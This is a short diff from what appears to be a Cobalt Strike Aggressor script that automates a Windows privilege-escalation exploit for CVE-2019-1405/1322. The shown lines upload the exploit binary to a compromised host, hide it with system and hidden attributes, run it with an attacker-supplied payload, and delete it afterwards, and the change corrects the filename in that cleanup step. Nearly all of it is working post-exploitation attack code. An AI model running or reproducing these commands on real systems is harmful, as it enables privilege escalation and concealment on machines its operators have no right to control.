@@ -93,7 +93,7 @@ sub CVE_2019_1405_1322{
     bupload($bid, script_resource("exp/com/1405_1322_x64.exe"));
     bshell($bid, "attrib \"1405_1322_x64.exe\" +s +h");
     bshell($bid,"1405_1322_x64.exe \"".$payload."\"");
-    bshell($bid,"del /F /S /Q /AH $Rch $+ .exe");
+    bshell($bid,"del /F /S /Q /AH 1405_1322_x64.exe");
 }
 
 #append menus
